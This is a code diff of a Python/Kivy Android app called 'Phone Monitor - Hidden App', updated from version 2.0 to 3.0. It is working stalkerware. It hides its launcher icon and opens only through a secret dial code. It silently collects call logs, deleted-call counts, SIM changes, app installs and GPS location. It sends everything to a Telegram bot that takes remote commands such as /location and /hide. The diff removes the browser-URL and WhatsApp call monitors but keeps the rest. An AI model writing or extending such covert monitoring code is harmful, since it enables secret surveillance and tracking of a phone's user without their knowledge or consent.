@@ -1,18 +1,7 @@
 """
-Phone Monitor - Hidden App
-Version: 2.0
+Phone Monitor - Hidden App with Accessibility Service
+Version: 3.0
 Secret Code: *#*#1234#*#*
-
-Features:
-- Call Logs (all details)
-- WhatsApp Calls
-- Browser URLs
-- App Install/Uninstall
-- SIM Change Detection
-- Location on Demand
-- Daily Summary
-- START/STOP with catch-up
-- Hidden App Icon
 """
 
 from kivy.app import App
@@ -38,12 +27,10 @@ from datetime import datetime, timedelta
 if platform != 'android':
     Window.size = (400, 700)
 
-# Android specific imports
 if platform == 'android':
-    from android.permissions import request_permissions, Permission
-    from android.broadcast import BroadcastReceiver
+    from android.permissions import request_permissions, Permission, check_permission
     from android import mActivity, api_version
-    from jnius import autoclass, cast
+    from jnius import autoclass, cast, PythonJavaClass, java_method
     
     # Java classes
     PythonActivity = autoclass('org.kivy.android.PythonActivity')
@@ -57,6 +44,7 @@ if platform == 'android':
     TelephonyManager = autoclass('android.telephony.TelephonyManager')
     LocationManager = autoclass('android.location.LocationManager')
     Build = autoclass('android.os.Build')
+    String = autoclass('java.lang.String')
 
 
 class TelegramBot:
@@ -113,7 +101,6 @@ class TelegramBot:
             return []
     
     def process_commands(self):
-        """Process incoming Telegram commands"""
         updates = self.get_updates()
         commands = []
         
@@ -138,7 +125,7 @@ class TelegramBot:
 
 
 class DataStore:
-    """Persistent storage to prevent duplicates"""
+    """Persistent storage"""
     
     def __init__(self):
         self.store = JsonStore('monitor_data.json')
@@ -151,7 +138,6 @@ class DataStore:
                 last_call_count=0,
                 sent_call_ids=[],
                 sent_urls=[],
-                sent_app_events=[],
                 last_sim_serial="",
                 stopped_at="",
                 is_monitoring=False,
@@ -184,7 +170,6 @@ class DataStore:
         sent_ids = self.get('sent_call_ids', [])
         if call_id not in sent_ids:
             sent_ids.append(call_id)
-            # Keep only last 1000 IDs
             if len(sent_ids) > 1000:
                 sent_ids = sent_ids[-1000:]
             self.set('sent_call_ids', sent_ids)
@@ -197,7 +182,6 @@ class DataStore:
         sent_urls = self.get('sent_urls', [])
         if url not in sent_urls:
             sent_urls.append(url)
-            # Keep only last 500 URLs
             if len(sent_urls) > 500:
                 sent_urls = sent_urls[-500:]
             self.set('sent_urls', sent_urls)
@@ -229,11 +213,9 @@ class CallLogMonitor:
     def __init__(self, app):
         self.app = app
         self.running = False
-        self.last_count = 0
     
     def start(self):
         self.running = True
-        self.last_count = self._get_call_count()
         threading.Thread(target=self._monitor_loop, daemon=True).start()
     
     def stop(self):
@@ -265,7 +247,6 @@ class CallLogMonitor:
             return 0
     
     def _check_deleted_calls(self):
-        """Check if calls were deleted"""
         if platform != 'android':
             return
         
@@ -273,7 +254,6 @@ class CallLogMonitor:
         last_count = self.app.data_store.get('last_call_count', 0)
         
         if last_count > 0 and current_count < last_count:
-            # Calls were deleted!
             deleted = last_count - current_count
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
@@ -290,7 +270,6 @@ class CallLogMonitor:
         self.app.data_store.set('last_call_count', current_count)
     
     def _check_new_calls(self):
-        """Check for new calls"""
         if platform != 'android':
             return
         
@@ -307,7 +286,6 @@ class CallLogMonitor:
                 CallLog.DURATION
             ]
             
-            # Get calls from last 7 days or since stopped_at
             stopped_at = self.app.data_store.get('stopped_at', '')
             if stopped_at:
                 try:
@@ -348,9 +326,6 @@ class CallLogMonitor:
             print(f"Call check error: {e}")
     
     def _send_call_notification(self, call_id, number, name, call_type, call_date, duration):
-        """Send call notification to Telegram"""
-        
-        # Format call type
         type_names = {
             1: "📥 Incoming",
             2: "📤 Outgoing",
@@ -361,11 +336,9 @@ class CallLogMonitor:
         }
         type_str = type_names.get(call_type, "📞 Unknown")
         
-        # Format time
         call_time = datetime.fromtimestamp(call_date / 1000)
         time_str = call_time.strftime('%Y-%m-%d %H:%M:%S')
         
-        # Format duration
         mins, secs = divmod(duration, 60)
         hours, mins = divmod(mins, 60)
         if hours:
@@ -386,7 +359,6 @@ class CallLogMonitor:
         self.app.bot.send_message(message)
         self.app.data_store.mark_call_sent(call_id)
         
-        # Add to daily summary
         self.app.data_store.add_daily_call({
             'name': name,
             'number': number,
@@ -398,9 +370,8 @@ class CallLogMonitor:
         self.app.add_log(f"📞 Call: {name} ({type_str})")
     
     def get_recent_calls(self, count=10):
-        """Get recent calls for /history command"""
         if platform != 'android':
-            return "Not available on this device"
+            return "Not available"
         
         try:
             context = mActivity.getApplicationContext()
@@ -419,12 +390,13 @@ class CallLogMonitor:
                 projection,
                 None,
                 None,
-                f"{CallLog.DATE} DESC LIMIT {count}"
+                f"{CallLog.DATE} DESC"
             )
             
             calls = []
             if cursor:
-                while cursor.moveToNext():
+                i = 0
+                while cursor.moveToNext() and i < count:
                     number = cursor.getString(0) or "Unknown"
                     name = cursor.getString(1) or "Unknown"
                     call_type = cursor.getInt(2)
@@ -438,7 +410,8 @@ class CallLogMonitor:
                     mins, secs = divmod(duration, 60)
                     dur_str = f"{mins}m{secs}s" if mins else f"{secs}s"
                     
-                    calls.append(f"{type_str} {name} ({number}) - {dur_str} - {call_time}")
+                    calls.append(f"{type_str} {name} - {dur_str} - {call_time}")
+                    i += 1
                 
                 cursor.close()
             
@@ -448,127 +421,6 @@ class CallLogMonitor:
             
         except Exception as e:
             return f"Error: {e}"
-
-
-class BrowserMonitor:
-    """Monitor browser URLs using Accessibility"""
-    
-    def __init__(self, app):
-        self.app = app
-        self.running = False
-        self.last_url = ""
-    
-    def start(self):
-        self.running = True
-        self.app.add_log("🌐 Browser monitoring needs Accessibility Service")
-    
-    def stop(self):
-        self.running = False
-    
-    def on_url_detected(self, url, browser_name, title=""):
-        """Called when URL is detected"""
-        if not self.app.data_store.get('is_monitoring', False):
-            return
-        
-        if not url or url == self.last_url:
-            return
-        
-        if not url.startswith("http"):
-            return
-        
-        if self.app.data_store.is_url_sent(url):
-            return
-        
-        self.last_url = url
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        
-        message = f"""🌐 <b>Browser Activity</b>
-
-📱 <b>Browser:</b> {browser_name}
-🔗 <b>URL:</b> {url}
-📄 <b>Title:</b> {title or 'N/A'}
-🕐 <b>Time:</b> {timestamp}"""
-        
-        self.app.bot.send_message(message)
-        self.app.data_store.mark_url_sent(url)
-        
-        # Add to daily summary
-        self.app.data_store.add_daily_url({
-            'url': url,
-            'browser': browser_name,
-            'time': timestamp
-        })
-        
-        self.app.add_log(f"🌐 URL: {url[:40]}...")
-
-
-class NotificationMonitor:
-    """Monitor notifications for WhatsApp calls, etc."""
-    
-    def __init__(self, app):
-        self.app = app
-        self.running = False
-        self.last_notification = ""
-    
-    def start(self):
-        self.running = True
-        self.app.add_log("📱 Notification monitoring needs Accessibility Service")
-    
-    def stop(self):
-        self.running = False
-    
-    def on_notification(self, app_name, title, text, time_str=""):
-        """Called when notification is received"""
-        if not self.app.data_store.get('is_monitoring', False):
-            return
-        
-        notification_key = f"{app_name}:{title}:{text}"
-        if notification_key == self.last_notification:
-            return
-        
-        self.last_notification = notification_key
-        timestamp = time_str or datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        
-        # Check for WhatsApp calls
-        app_lower = app_name.lower()
-        title_lower = title.lower() if title else ""
-        text_lower = text.lower() if text else ""
-        
-        is_whatsapp = "whatsapp" in app_lower
-        is_call = any(word in title_lower + text_lower for word in ["call", "calling", "incoming", "outgoing"])
-        
-        if is_whatsapp and is_call:
-            call_type = "🎥 Video" if "video" in text_lower else "🎤 Voice"
-            
-            message = f"""📱 <b>WhatsApp Call</b>
-
-👤 <b>From:</b> {title}
-📋 <b>Type:</b> {call_type} Call
-📝 <b>Details:</b> {text}
-🕐 <b>Time:</b> {timestamp}"""
-            
-            self.app.bot.send_message(message)
-            
-            # Add to daily summary
-            self.app.data_store.add_daily_whatsapp({
-                'name': title,
-                'type': call_type,
-                'time': timestamp
-            })
-            
-            self.app.add_log(f"📱 WhatsApp: {title} ({call_type})")
-        
-        # Check for other app calls (Telegram, Instagram, etc.)
-        elif is_call and not is_whatsapp:
-            message = f"""📱 <b>App Call</b>
-
-📦 <b>App:</b> {app_name}
-👤 <b>From:</b> {title}
-📝 <b>Details:</b> {text}
-🕐 <b>Time:</b> {timestamp}"""
-            
-            self.app.bot.send_message(message)
-            self.app.add_log(f"📱 {app_name}: {title}")
 
 
 class AppMonitor:
@@ -605,17 +457,15 @@ class AppMonitor:
                     self._check_app_changes()
             except Exception as e:
                 print(f"App monitor error: {e}")
-            time.sleep(60)  # Check every minute
+            time.sleep(60)
     
     def _check_app_changes(self):
         current_apps = self._get_installed_apps()
         
-        # New apps
         new_apps = current_apps - self.installed_apps
         for pkg in new_apps:
             self._notify_app_installed(pkg)
         
-        # Removed apps
         removed_apps = self.installed_apps - current_apps
         for pkg in removed_apps:
             self._notify_app_uninstalled(pkg)
@@ -625,14 +475,13 @@ class AppMonitor:
     def _notify_app_installed(self, package_name):
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        # Try to get app name
         app_name = package_name
         if platform == 'android':
             try:
                 context = mActivity.getApplicationContext()
                 pm = context.getPackageManager()
                 app_info = pm.getApplicationInfo(package_name, 0)
-                app_name = pm.getApplicationLabel(app_info)
+                app_name = str(pm.getApplicationLabel(app_info))
             except:
                 pass
         
@@ -658,17 +507,17 @@ class AppMonitor:
 
 
 class SIMMonitor:
-    """Monitor SIM card changes"""
+    """Monitor SIM changes"""
     
     def __init__(self, app):
         self.app = app
         self.running = False
-        self.last_sim_serial = ""
     
     def start(self):
         self.running = True
-        self.last_sim_serial = self._get_sim_serial()
-        self.app.data_store.set('last_sim_serial', self.last_sim_serial)
+        if platform == 'android':
+            serial = self._get_sim_serial()
+            self.app.data_store.set('last_sim_serial', serial)
         threading.Thread(target=self._monitor_loop, daemon=True).start()
     
     def stop(self):
@@ -692,11 +541,10 @@ class SIMMonitor:
             tm = context.getSystemService(Context.TELEPHONY_SERVICE)
             return {
                 'carrier': tm.getNetworkOperatorName() or "Unknown",
-                'number': tm.getLine1Number() or "Unknown",
                 'country': tm.getNetworkCountryIso() or "Unknown"
             }
         except:
-            return {'carrier': 'Unknown', 'number': 'Unknown', 'country': 'Unknown'}
+            return {'carrier': 'Unknown', 'country': 'Unknown'}
     
     def _monitor_loop(self):
         while self.running:
@@ -711,21 +559,21 @@ class SIMMonitor:
         current_serial = self._get_sim_serial()
         last_serial = self.app.data_store.get('last_sim_serial', '')
         
-        if last_serial and current_serial != last_serial:
+        if last_serial and current_serial and current_serial != last_serial:
             sim_info = self._get_sim_info()
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
             message = f"""⚠️ <b>SIM Card Changed!</b>
 
 📡 <b>Carrier:</b> {sim_info['carrier']}
-📞 <b>Number:</b> {sim_info['number']}
 🌍 <b>Country:</b> {sim_info['country']}
 🕐 <b>Detected:</b> {timestamp}"""
             
             self.app.bot.send_message(message)
             self.app.add_log("⚠️ SIM card changed!")
         
-        self.app.data_store.set('last_sim_serial', current_serial)
+        if current_serial:
+            self.app.data_store.set('last_sim_serial', current_serial)
 
 
 class LocationHelper:
@@ -740,10 +588,8 @@ class LocationHelper:
             context = mActivity.getApplicationContext()
             lm = context.getSystemService(Context.LOCATION_SERVICE)
             
-            # Try GPS first
             location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
             if not location:
-                # Try network
                 location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
             
             if location:
@@ -755,7 +601,7 @@ class LocationHelper:
 
 
 class DailySummary:
-    """Generate and send daily summary"""
+    """Daily summary at midnight"""
     
     def __init__(self, app):
         self.app = app
@@ -775,14 +621,13 @@ class DailySummary:
                 if self.app.data_store.get('is_monitoring', False):
                     self._check_midnight()
             except Exception as e:
-                print(f"Daily summary error: {e}")
+                print(f"Summary error: {e}")
             time.sleep(60)
     
     def _check_midnight(self):
         now = datetime.now()
         today = now.strftime('%Y-%m-%d')
         
-        # Send summary at midnight (00:00 - 00:05)
         if now.hour == 0 and now.minute < 5:
             if self.last_summary_date != today:
                 self._send_summary()
@@ -795,12 +640,10 @@ class DailySummary:
         urls = self.app.data_store.get('daily_urls', [])
         whatsapp = self.app.data_store.get('daily_whatsapp', [])
         
-        # Format calls by type
         incoming = [c for c in calls if c.get('type') == 1]
         outgoing = [c for c in calls if c.get('type') == 2]
         missed = [c for c in calls if c.get('type') == 3]
         
-        # Format call details with names
         def format_calls(call_list, limit=10):
             if not call_list:
                 return "   None"
@@ -812,22 +655,6 @@ class DailySummary:
                 lines.append(f"   • {name} - {dur}")
             return "\n".join(lines)
         
-        # Count URL domains
-        url_domains = {}
-        for u in urls:
-            try:
-                domain = u.get('url', '').split('/')[2]
-                url_domains[domain] = url_domains.get(domain, 0) + 1
-            except:
-                pass
-        
-        top_urls = sorted(url_domains.items(), key=lambda x: x[1], reverse=True)[:5]
-        top_urls_str = "\n".join([f"   • {domain} - {count} times" for domain, count in top_urls]) or "   None"
-        
-        # Format WhatsApp calls
-        wa_str = "\n".join([f"   • {w.get('name', 'Unknown')} - {w.get('type', 'Call')}" for w in whatsapp[:10]]) or "   None"
-        
-        # Get location
         lat, lon = LocationHelper.get_location()
         location_str = f"📍 https://maps.google.com/?q={lat},{lon}" if lat else "📍 Location unavailable"
         
@@ -844,18 +671,14 @@ class DailySummary:
 ❌ <b>Missed ({len(missed)}):</b>
 {format_calls(missed)}
 
-📱 <b>WhatsApp Calls ({len(whatsapp)}):</b>
-{wa_str}
+📱 <b>WhatsApp Calls:</b> {len(whatsapp)}
 
-🌐 <b>URLs Visited ({len(urls)}):</b>
-{top_urls_str}
+🌐 <b>URLs Visited:</b> {len(urls)}
 
 {location_str}"""
         
         self.app.bot.send_message(message)
         self.app.add_log("📊 Daily summary sent")
-        
-        # Clear daily data
         self.app.data_store.clear_daily_data()
 
 
@@ -876,9 +699,10 @@ class CommandHandler:
     def _command_loop(self):
         while self.running:
             try:
-                commands = self.app.bot.process_commands()
-                for cmd in commands:
-                    self._handle_command(cmd)
+                if self.app.bot:
+                    commands = self.app.bot.process_commands()
+                    for cmd in commands:
+                        self._handle_command(cmd)
             except Exception as e:
                 print(f"Command error: {e}")
             time.sleep(3)
@@ -900,8 +724,6 @@ class CommandHandler:
             self._cmd_history(cmd)
         elif cmd.startswith('/browsers'):
             self._cmd_browsers(cmd)
-        elif cmd == '/apps':
-            self._cmd_apps()
         elif cmd == '/show':
             self._cmd_show()
         elif cmd == '/hide':
@@ -910,49 +732,36 @@ class CommandHandler:
             self._cmd_help()
     
     def _cmd_start(self):
-        stopped_at = self.app.data_store.get('stopped_at', '')
-        
         self.app.data_store.set('is_monitoring', True)
         self.app.data_store.set('stopped_at', '')
         
         self.app.bot.send_message("▶️ <b>Monitoring STARTED!</b>\n\n📋 Catching up on missed events...")
-        
-        # Update UI
         Clock.schedule_once(lambda dt: self.app.update_ui_status(True))
+        self.app.add_log("▶️ Started via Telegram")
         
-        self.app.add_log("▶️ Monitoring started via Telegram")
-        
-        # After a short delay, confirm catch-up complete
-        time.sleep(5)
-        self.app.bot.send_message("✅ <b>Catch-up complete!</b>\n\nNow monitoring in real-time.")
+        time.sleep(3)
+        self.app.bot.send_message("✅ <b>Now monitoring in real-time!</b>")
     
     def _cmd_stop(self):
         self.app.data_store.set('is_monitoring', False)
         self.app.data_store.set('stopped_at', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
         
-        self.app.bot.send_message("⏹️ <b>Monitoring STOPPED!</b>\n\n🔇 No notifications until you send /start")
-        
-        # Update UI
+        self.app.bot.send_message("⏹️ <b>Monitoring STOPPED!</b>\n\n🔇 No notifications until /start")
         Clock.schedule_once(lambda dt: self.app.update_ui_status(False))
-        
-        self.app.add_log("⏹️ Monitoring stopped via Telegram")
+        self.app.add_log("⏹️ Stopped via Telegram")
     
     def _cmd_status(self):
-        is_monitoring = self.app.data_store.get('is_monitoring', False)
-        status = "🟢 ACTIVE" if is_monitoring else "🔴 STOPPED"
-        
-        stopped_at = self.app.data_store.get('stopped_at', '')
-        stopped_str = f"\n⏹️ Stopped at: {stopped_at}" if stopped_at else ""
+        is_mon = self.app.data_store.get('is_monitoring', False)
+        status = "🟢 ACTIVE" if is_mon else "🔴 STOPPED"
         
         message = f"""📊 <b>Status</b>
 
-📡 <b>Monitoring:</b> {status}{stopped_str}
+📡 <b>Monitoring:</b> {status}
 
 📞 Call Logs: ✅
-🌐 Browser URLs: ✅
-📱 WhatsApp Calls: ✅
 📲 App Install: ✅
-📵 SIM Change: ✅"""
+📵 SIM Change: ✅
+📍 Location: ✅"""
         
         self.app.bot.send_message(message)
     
@@ -963,25 +772,21 @@ class CommandHandler:
         
         if lat and lon:
             self.app.bot.send_location(lat, lon)
-            self.app.bot.send_message(f"📍 <b>Location</b>\n\n🗺️ https://maps.google.com/?q={lat},{lon}")
+            self.app.bot.send_message(f"📍 https://maps.google.com/?q={lat},{lon}")
         else:
-            self.app.bot.send_message("❌ Could not get location. Make sure GPS is enabled.")
+            self.app.bot.send_message("❌ Location unavailable. Enable GPS.")
     
     def _cmd_info(self):
         if platform != 'android':
-            self.app.bot.send_message("ℹ️ Device info not available")
+            self.app.bot.send_message("ℹ️ Not available")
             return
         
         try:
-            manufacturer = Build.MANUFACTURER
-            model = Build.MODEL
-            android_version = Build.VERSION.RELEASE
-            
             message = f"""ℹ️ <b>Device Info</b>
 
-📱 <b>Device:</b> {manufacturer} {model}
-🤖 <b>Android:</b> {android_version}
-📦 <b>App:</b> Phone Monitor v2.0"""
+📱 <b>Device:</b> {Build.MANUFACTURER} {Build.MODEL}
+🤖 <b>Android:</b> {Build.VERSION.RELEASE}
+📦 <b>App:</b> Phone Monitor v3.0"""
             
             self.app.bot.send_message(message)
         except Exception as e:
@@ -991,7 +796,7 @@ class CommandHandler:
         try:
             parts = cmd.split()
             count = int(parts[1]) if len(parts) > 1 else 10
-            count = min(count, 50)  # Max 50
+            count = min(count, 50)
         except:
             count = 10
         
@@ -999,33 +804,22 @@ class CommandHandler:
         self.app.bot.send_message(result)
     
     def _cmd_browsers(self, cmd):
-        try:
-            parts = cmd.split()
-            count = int(parts[1]) if len(parts) > 1 else 10
-            count = min(count, 50)
-        except:
-            count = 10
-        
-        urls = self.app.data_store.get('sent_urls', [])[-count:]
+        urls = self.app.data_store.get('sent_urls', [])[-10:]
         
         if urls:
             urls_str = "\n".join([f"• {url[:50]}..." for url in urls])
-            message = f"🌐 <b>Last {len(urls)} URLs:</b>\n\n{urls_str}"
+            message = f"🌐 <b>Last URLs:</b>\n\n{urls_str}"
         else:
-            message = "🌐 No URLs recorded yet"
+            message = "🌐 No URLs recorded"
         
         self.app.bot.send_message(message)
     
-    def _cmd_apps(self):
-        message = "📲 <b>Recently Installed Apps</b>\n\n(Check notifications for app install/uninstall events)"
-        self.app.bot.send_message(message)
-    
     def _cmd_show(self):
-        self.app.show_app_icon()
-        self.app.bot.send_message("👁️ App icon is now <b>VISIBLE</b> for 5 minutes")
+        Clock.schedule_once(lambda dt: self.app.show_app_icon())
+        self.app.bot.send_message("👁️ App icon is now <b>VISIBLE</b>")
     
     def _cmd_hide(self):
-        self.app.hide_app_icon()
+        Clock.schedule_once(lambda dt: self.app.hide_app_icon())
         self.app.bot.send_message("🙈 App icon is now <b>HIDDEN</b>")
     
     def _cmd_help(self):
@@ -1037,13 +831,13 @@ class CommandHandler:
 
 📍 /location - Get GPS location
 ℹ️ /info - Device info
-📞 /history 10 - Last 10 calls
-🌐 /browsers 10 - Last 10 URLs
-📲 /apps - Installed apps
+📞 /history 10 - Last calls
 
 👁️ /show - Show app icon
 🙈 /hide - Hide app icon
-📖 /help - This help"""
+📖 /help - This help
+
+🔓 Dial *#*#1234#*#* to open app"""
         
         self.app.bot.send_message(message)
 
@@ -1055,33 +849,28 @@ class SettingsPopup(Popup):
         super().__init__(**kwargs)
         self.app = app
         self.title = "⚙️ Settings"
-        self.size_hint = (0.95, 0.9)
+        self.size_hint = (0.95, 0.8)
         
         layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(8))
         
-        # Token
         layout.add_widget(Label(text="Bot Token:", size_hint_y=None, height=dp(25)))
         self.token_input = TextInput(
             text=app.settings_store.get('config')['token'] if app.settings_store.exists('config') else '',
             multiline=False,
             size_hint_y=None,
-            height=dp(40),
-            hint_text="Enter Telegram Bot Token"
+            height=dp(40)
         )
         layout.add_widget(self.token_input)
         
-        # Chat ID
         layout.add_widget(Label(text="Chat ID:", size_hint_y=None, height=dp(25)))
         self.chat_input = TextInput(
             text=app.settings_store.get('config')['chat_id'] if app.settings_store.exists('config') else '',
             multiline=False,
             size_hint_y=None,
-            height=dp(40),
-            hint_text="Enter Telegram Chat ID"
+            height=dp(40)
         )
         layout.add_widget(self.chat_input)
         
-        # Buttons row
         btn_layout = BoxLayout(size_hint_y=None, height=dp(45), spacing=dp(10))
         
         test_btn = Button(text="🔍 Test", background_color=(0.2, 0.6, 1, 1))
@@ -1096,29 +885,6 @@ class SettingsPopup(Popup):
         
         self.status_label = Label(text="", size_hint_y=None, height=dp(30))
         layout.add_widget(self.status_label)
-        
-        # Accessibility button
-        if platform == 'android':
-            acc_btn = Button(
-                text="🔧 Open Accessibility Settings",
-                size_hint_y=None,
-                height=dp(45),
-                background_color=(1, 0.5, 0, 1)
-            )
-            acc_btn.bind(on_press=self.open_accessibility)
-            layout.add_widget(acc_btn)
-        
-        # Info
-        info_text = """
-📌 After saving:
-1. Open Accessibility Settings
-2. Find "Phone Monitor" 
-3. Enable it
-4. App will hide automatically
-
-🔓 To open again: Dial *#*#1234#*#*
-        """
-        layout.add_widget(Label(text=info_text, size_hint_y=None, height=dp(120), font_size=dp(11)))
         
         self.content = layout
     
@@ -1140,29 +906,16 @@ class SettingsPopup(Popup):
             chat_id = self.chat_input.text.strip()
             
             if not token or not chat_id:
-                self.status_label.text = "❌ Enter both Token and Chat ID"
+                self.status_label.text = "❌ Enter both fields"
                 return
             
-            self.app.settings_store.put('config',
-                token=token,
-                chat_id=chat_id
-            )
-            
+            self.app.settings_store.put('config', token=token, chat_id=chat_id)
             self.app.bot = TelegramBot(token, chat_id)
-            self.status_label.text = "✅ Saved! Now enable Accessibility."
-            
+            self.status_label.text = "✅ Saved!"
             self.app.add_log("✅ Settings saved")
             
         except Exception as e:
-            self.status_label.text = f"❌ Error: {e}"
-    
-    def open_accessibility(self, instance):
-        if platform == 'android':
-            try:
-                intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                mActivity.startActivity(intent)
-            except Exception as e:
-                self.status_label.text = f"Error: {e}"
+            self.status_label.text = f"❌ {e}"
 
 
 class MainScreen(BoxLayout):
@@ -1175,7 +928,6 @@ class MainScreen(BoxLayout):
         self.padding = dp(15)
         self.spacing = dp(10)
         
-        # Title
         self.add_widget(Label(
             text="📱 Phone Monitor",
             font_size=dp(24),
@@ -1184,7 +936,6 @@ class MainScreen(BoxLayout):
             bold=True
         ))
         
-        # Status
         self.status_label = Label(
             text="⏹️ STOPPED",
             font_size=dp(20),
@@ -1194,7 +945,6 @@ class MainScreen(BoxLayout):
         )
         self.add_widget(self.status_label)
         
-        # START/STOP button
         self.start_btn = Button(
             text="▶️ START MONITORING",
             size_hint_y=None,
@@ -1205,7 +955,6 @@ class MainScreen(BoxLayout):
         self.start_btn.bind(on_press=self.toggle_monitoring)
         self.add_widget(self.start_btn)
         
-        # Settings button
         settings_btn = Button(
             text="⚙️ Settings",
             size_hint_y=None,
@@ -1215,7 +964,6 @@ class MainScreen(BoxLayout):
         settings_btn.bind(on_press=self.open_settings)
         self.add_widget(settings_btn)
         
-        # Hide button
         hide_btn = Button(
             text="🙈 HIDE APP & START",
             size_hint_y=None,
@@ -1225,7 +973,6 @@ class MainScreen(BoxLayout):
         hide_btn.bind(on_press=self.hide_and_start)
         self.add_widget(hide_btn)
         
-        # Uninstall button
         uninstall_btn = Button(
             text="🗑️ Uninstall App",
             size_hint_y=None,
@@ -1235,12 +982,11 @@ class MainScreen(BoxLayout):
         uninstall_btn.bind(on_press=self.uninstall_app)
         self.add_widget(uninstall_btn)
         
-        # Log area
-        self.add_widget(Label(text="📋 Activity Log:", size_hint_y=None, height=dp(25)))
+        self.add_widget(Label(text="📋 Log:", size_hint_y=None, height=dp(25)))
         
         scroll = ScrollView(size_hint=(1, 1))
         self.log_text = Label(
-            text="App ready...\nDial *#*#1234#*#* to open if hidden\n\n",
+            text="Ready...\n🔓 Dial *#*#1234#*#* to open\n\n",
             size_hint_y=None,
             halign='left',
             valign='top',
@@ -1296,7 +1042,7 @@ class MainScreen(BoxLayout):
         
         self.start_monitoring()
         self.app.hide_app_icon()
-        self.app.add_log("🙈 App hidden. Dial *#*#1234#*#* to open")
+        self.app.add_log("🙈 App hidden")
         
         if self.app.bot:
             self.app.bot.send_message("🙈 App is now <b>HIDDEN</b>\n\n🔓 Dial *#*#1234#*#* to open")
@@ -1304,66 +1050,56 @@ class MainScreen(BoxLayout):
     def uninstall_app(self, instance):
         if platform == 'android':
             try:
-                # First show app icon
                 self.app.show_app_icon()
-                
-                # Open uninstall dialog
                 package_name = mActivity.getPackageName()
                 intent = Intent(Intent.ACTION_DELETE)
                 intent.setData(Uri.parse(f"package:{package_name}"))
                 mActivity.startActivity(intent)
             except Exception as e:
-                self.app.add_log(f"❌ Uninstall error: {e}")
+                self.app.add_log(f"❌ {e}")
 
 
 class PhoneMonitorApp(App):
-    """Main Application"""
+    """Main App"""
     
     def build(self):
         self.title = "Phone Monitor"
         
-        # Request permissions
         if platform == 'android':
-            request_permissions([
-                Permission.READ_CALL_LOG,
-                Permission.READ_CONTACTS,
-                Permission.READ_PHONE_STATE,
-                Permission.ACCESS_FINE_LOCATION,
-                Permission.ACCESS_COARSE_LOCATION,
-                Permission.INTERNET,
-                Permission.RECEIVE_BOOT_COMPLETED,
-                Permission.FOREGROUND_SERVICE,
-                Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
-            ])
+            self._request_permissions()
         
-        # Initialize stores
         self.settings_store = JsonStore('settings.json')
         self.data_store = DataStore()
         
-        # Initialize bot
         self.bot = None
         self._load_settings()
         
-        # Initialize monitors
         self.call_monitor = CallLogMonitor(self)
-        self.browser_monitor = BrowserMonitor(self)
-        self.notification_monitor = NotificationMonitor(self)
         self.app_monitor = AppMonitor(self)
         self.sim_monitor = SIMMonitor(self)
         self.daily_summary = DailySummary(self)
         self.command_handler = CommandHandler(self)
         
-        # Start all monitors
         self._start_monitors()
         
-        # Create main screen
         self.main_screen = MainScreen(self)
         
-        # Update UI based on saved state
         if self.data_store.get('is_monitoring', False):
             Clock.schedule_once(lambda dt: self.update_ui_status(True), 1)
         
         return self.main_screen
+    
+    def _request_permissions(self):
+        request_permissions([
+            Permission.READ_CALL_LOG,
+            Permission.READ_CONTACTS,
+            Permission.READ_PHONE_STATE,
+            Permission.ACCESS_FINE_LOCATION,
+            Permission.ACCESS_COARSE_LOCATION,
+            Permission.INTERNET,
+            Permission.RECEIVE_BOOT_COMPLETED,
+            Permission.FOREGROUND_SERVICE,
+        ])
     
     def _load_settings(self):
         try:
@@ -1375,26 +1111,22 @@ class PhoneMonitorApp(App):
                 if token and chat_id:
                     self.bot = TelegramBot(token, chat_id)
         except Exception as e:
-            print(f"Settings load error: {e}")
+            print(f"Load error: {e}")
     
     def _start_monitors(self):
         self.call_monitor.start()
-        self.browser_monitor.start()
-        self.notification_monitor.start()
         self.app_monitor.start()
         self.sim_monitor.start()
         self.daily_summary.start()
         self.command_handler.start()
     
     def add_log(self, msg):
-        """Add to activity log"""
         def update(dt):
             t = datetime.now().strftime('%H:%M:%S')
             self.main_screen.log_text.text += f"[{t}] {msg}\n"
         Clock.schedule_once(update)
     
     def update_ui_status(self, is_monitoring):
-        """Update UI based on monitoring status"""
         if is_monitoring:
             self.main_screen.status_label.text = "🟢 MONITORING"
             self.main_screen.status_label.color = (0.2, 0.8, 0.2, 1)
@@ -1407,7 +1139,6 @@ class PhoneMonitorApp(App):
             self.main_screen.start_btn.background_color = (0.2, 0.8, 0.2, 1)
     
     def hide_app_icon(self):
-        """Hide app icon from launcher"""
         if platform == 'android':
             try:
                 context = mActivity.getApplicationContext()
@@ -1420,12 +1151,11 @@ class PhoneMonitorApp(App):
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 )
-                self.add_log("🙈 App icon hidden")
+                self.add_log("🙈 Hidden")
             except Exception as e:
                 self.add_log(f"Hide error: {e}")
     
     def show_app_icon(self):
-        """Show app icon in launcher"""
         if platform == 'android':
             try:
                 context = mActivity.getApplicationContext()
@@ -1438,16 +1168,14 @@ class PhoneMonitorApp(App):
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP
                 )
-                self.add_log("👁️ App icon visible")
+                self.add_log("👁️ Visible")
             except Exception as e:
                 self.add_log(f"Show error: {e}")
     
     def on_pause(self):
-        """App paused - continue running in background"""
         return True
     
     def on_resume(self):
-        """App resumed"""
         pass
 
 
